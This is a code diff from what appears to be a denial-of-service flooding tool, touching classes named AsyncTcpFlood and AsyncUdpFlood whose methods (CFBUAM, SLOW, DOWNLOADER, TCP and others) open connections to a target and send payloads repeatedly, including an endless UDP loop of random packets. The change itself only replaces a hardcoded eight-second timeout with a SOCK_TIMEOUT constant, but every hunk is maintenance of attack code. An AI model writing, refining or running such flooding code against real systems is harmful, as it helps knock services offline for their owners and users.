@@ -931,7 +931,7 @@ class AsyncTcpFlood(HttpFlood):
     async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
         rpc = rpc or self._rpc
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
         self._stats.track_open_connection()
         try:
             for _ in range(rpc):
@@ -1060,7 +1060,7 @@ class AsyncTcpFlood(HttpFlood):
     async def CFBUAM(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
         self._stats.track_open_connection()
         try:
             writer.write(payload)
@@ -1085,7 +1085,7 @@ class AsyncTcpFlood(HttpFlood):
     async def EVEN(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
         self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
@@ -1108,7 +1108,7 @@ class AsyncTcpFlood(HttpFlood):
     async def AVB(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
         self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
@@ -1127,7 +1127,7 @@ class AsyncTcpFlood(HttpFlood):
     async def SLOW(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
         self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
@@ -1158,7 +1158,7 @@ class AsyncTcpFlood(HttpFlood):
     async def DOWNLOADER(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
         self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
@@ -1180,7 +1180,7 @@ class AsyncTcpFlood(HttpFlood):
 
     async def TCP(self) -> bool:
         packets_sent, packet_size = 0, 1024
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
         self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
@@ -1207,7 +1207,7 @@ class AsyncUdpFlood(Layer4):
         # XXX: this is not going to work as well, need to pass as params
         loop = asyncio.get_event_loop()
         with socket(AF_INET, SOCK_DGRAM) as sock:
-            await asyncio.wait_for(loop.sock_connect(sock, self._target), timeout=8)
+            await asyncio.wait_for(loop.sock_connect(sock, self._target), timeout=SOCK_TIMEOUT)
             while True:
                 packet = randbytes(packet_size)
                 await asyncio.wait_for(loop.sock_sendall(sock, packet), timeout=1)
